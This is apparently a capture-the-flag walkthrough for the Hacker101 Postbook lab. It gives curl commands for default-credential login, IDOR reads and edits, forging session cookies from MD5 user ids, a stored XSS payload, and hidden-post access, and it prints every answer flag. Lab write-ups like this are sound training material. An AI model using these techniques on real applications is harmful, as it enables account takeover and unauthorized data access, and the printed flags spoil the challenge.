# Postbook (Hacker101)

PHP app with sign-in, posts (public/private), edit/delete. Session is weak; several IDOR and logic bugs. **Seven flags.**

> Replace `BASE` with your instance (e.g. `https://95c2f185a651826e8a3a48af6160e792.ctf.hacker101.com`).

---

## 1. Default credentials

Sign in as **`user` / `password`** (no signup required).

```bash
curl -sS -c jar.txt -X POST "$BASE/index.php?page=sign_in.php" \
  -d 'username=user&password=password'
curl -sS -b jar.txt "$BASE/index.php?page=home.php" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example flag:** `^FLAG^1f3d19d9b2cea566b8ee91010f4ad4995b9341beb8e0c420e2912d98eb535882$FLAG$`  
(Session cookie `id` is **MD5(user numeric id)** — here MD5 of `2`.)

---

## 2. IDOR — read another user’s **private** post

While logged in, open **`view.php&id=2`** (admin’s diary on a clean instance).

```bash
curl -sS -b 'id=<your_session>' "$BASE/index.php?page=view.php&id=2" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example flag:** `^FLAG^9eb896c7facfd9fe310e04f5ea1ce7e7198f14c66f70aab05b7963144f6ecd85$FLAG$`

---

## 3. Session forgery — cookie is **MD5(user id)**

Use **`id=c4ca4238a0b923820dcc509a6f75849b`** (MD5 of `"1"`) to impersonate user 1 / admin.

```bash
curl -sS -b 'id=c4ca4238a0b923820dcc509a6f75849b' \
  "$BASE/index.php?page=home.php" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example flag:** `^FLAG^4e38aa78e6c1c5d7f3afd6cfba54b22ed08130e80de6845212eef5aab7e943c4$FLAG$`

---

## 4. IDOR — **edit** someone else’s post

`POST` to `edit.php?id=2` (or another id) with your session; flag may appear in **`Location`** header.

**Example flag:** `^FLAG^ac6606e3e6823248f2d39ff5528091ca918b4e9b604abdff4c672a028335c4b5$FLAG$`

---

## 5. Weak **delete** token

`delete.php?id=<md5(post_id)>`. For post `1`, `id=c4ca4238a0b923820dcc509a6f75849b`. Flag in **`Location`**.

**Example flag:** `^FLAG^ccf6272db7702cc766f5c1c16087f17d3c6bd839eaf7a8d95f062c41520a4552$FLAG$`

---

## 6. Stored XSS in post body

Create a post with `<script>alert(1)</script>` in the body; flag appears in redirect / `message=` handling.

**Example flag:** `^FLAG^c6acbafe0a815b52822130d55b18f758e87e949ad9364b615c3bb92a2180cde0$FLAG$`

---

## 7. Hidden post id **945** (hint: **189 × 5**)

```bash
curl -sS -b 'id=<your_session>' \
  "$BASE/index.php?page=view.php&id=945" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example flag:** `^FLAG^cc4e867bd03ea631e0db8197bec7fced383dcb42742a2bfee54efeb0e510da1a$FLAG$`

---

## Extra: `user_id` tamper on create

The create form may include hidden **`user_id`**. Setting it to **`1`** posts as another user; on some builds the redirect shares the same flag as the XSS path above.

---

If a flag does not appear, reset the instance — several only show cleanly before heavy modification.
